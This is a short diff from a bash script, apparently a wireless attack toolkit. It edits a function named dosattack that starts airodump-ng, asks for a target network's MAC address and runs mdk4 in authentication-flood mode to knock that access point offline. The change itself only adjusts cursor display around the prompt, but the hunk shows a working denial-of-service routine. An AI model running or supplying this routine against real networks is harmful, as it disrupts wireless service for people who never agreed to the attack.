@@ -576,8 +576,9 @@ dosattack() {
 	tput civis; clear; echo -e "\n${blueColour}[*]$grayColour Starting DoS attack..."; sleep 2
 	xterm -e "airodump-ng ${tar}" &
 	dosairdump_PID=$!
-	echo -ne "\n$greenColour[?]$grayColour Select a network (MAC): " && read redos
+	tput cnorm; echo -ne "\n$greenColour[?]$grayColour Select a network (MAC): " && read redos
 	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
+	tput civis
 	sudo mdk4 $tar a -a $redos
 	echo -ne "\n\n${greenColour}[+]$grayColour Enter to continue" && read
 }
